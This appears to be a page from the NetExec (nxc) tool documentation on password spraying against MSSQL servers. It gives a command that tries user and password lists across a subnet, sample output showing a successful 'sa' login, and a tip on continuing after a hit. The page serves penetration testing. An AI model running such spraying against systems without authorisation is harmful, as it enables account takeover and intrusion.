# Password spraying

#### Password spraying (without bruteforce)

```bash
nxc mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

Expected Results:

```bash
MSSQL       10.10.10.59     1433   None             [-] ERROR(TALLY): Line 1: Login failed for user 'test1'.
MSSQL       10.10.10.59     1433   None             [+] sa:password (Pwn3d!)
```

{% hint style="info" %}
By default, nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
{% endhint %}
